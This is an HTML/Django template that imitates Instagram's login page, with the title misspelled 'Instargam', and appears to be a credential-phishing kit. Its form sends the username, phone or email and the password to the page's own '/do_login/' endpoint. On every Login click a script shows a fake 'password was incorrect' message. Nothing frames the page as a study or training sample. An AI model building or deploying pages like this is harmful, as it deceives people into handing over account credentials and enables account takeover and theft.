<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instargam</title>
  <script src="https://kit.fontawesome.com/038400d214.js" crossorigin="anonymous"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
    integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" crossorigin="anonymous">
  <style>
    .tt {
      display: none;
    }
    .instagram_logo{
			background-image: url("https://static.cdninstagram.com/rsrc.php/v3/yx/r/WtxJZZ3-9ZP.png");
			background-position: 0px 0px;
			background-size: 176px 186px;
			width: 174px;
			height: 50px;
			background-repeat: no-repeat;
			display: inline-block;
		}
  </style>
</head>

<body>
  <div class="container">
    <div class="row mt-5">
      <div class=" col-xl-6 d-none d-md-inline p-4"
        style="background-image: url(/static/downloaded/home-phones-2x.png); background-size: 100%;background-repeat: no-repeat;">
        <img src="/static/downloaded/screenshot1-2x.png" alt="" width="58%" height="100%"
          style="float: right;margin-top: 2%; margin-right: 10%;">
      </div>
      <div class="col-md-6">
        <div class="row">
          <div class=" col-md-8 " style="background-color: rgb(252, 250, 250);">
            <div class="row border pt-3 pl-5 pr-5 pb-3">
              <div class="col-12">
                <div class="row d-flex justify-content-center mt-3">
                  <i class="instagram_logo"></i>
              </div>                
              <div class="row">
                  <form action="/do_login/" method="post">
                    {% csrf_token %}
                    <input class="w-100 mt-3 h-25 " name="lmobile_username_email" type="text"
                      placeholder="Phone number, Username or Email">
                    <input class="w-100 mt-3 h-25" name="lpassword" type="password" placeholder="Password">
                    <button class="w-100 mt-3 h-25 btn btn-primary rounded-5" onclick="dalert()">Login</button>
                  </form>
                </div>
                <div class="row mt-5">
                  <div class="col-5">
                    <hr>
                  </div>
                  <div class="col-2">OR</div>
                  <div class="col-5">
                    <hr>
                  </div>
                </div>
                <div class="row fw-bolder text-bg-dark d-flex justify-content-center">
                  <a href="#"><b><i class="fa-brands fa-square-facebook"></i>Log in with
                      Facebook</b></a>
                </div>
                <div id="myElement" class="row text-sm-center p-1 text-danger tt">
                  <p>Sorry, your password was incorrect. Please double-check your password.</p>
                </div>
                <div class="row d-flex justify-content-center text-sm">
                  <a href="#" class="mt-2">Forget Password</a>
                </div>
              </div>
            </div>
            <div class="row border p-2 mt-3 d-flex justify-content-center">
              <p>Don't have an account? <a href="/registeration_page" class="fw-bolder">Sign Up</a> </p>
            </div>
            <div class="row fw-bolder  p-2 mt-3 ">
              <div class="col-12 d-flex justify-content-center">
                <p>Get the app </p>
              </div>
              <div class="col-6">
                <a href="#"><img src="/static/downloaded/c5Rp7Ym-Klz.png" height="100%" width="100%"></a>
              </div>
              <div class="col-6">
                <a href="#"><img src="/static/downloaded/EHY6QnZYdNX.png" height="100%" width="100%"></a>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
</body>

</html>
<script>

  function dalert() {
    const element = document.getElementById("myElement");
    element.classList.remove("tt");
  }
</script>
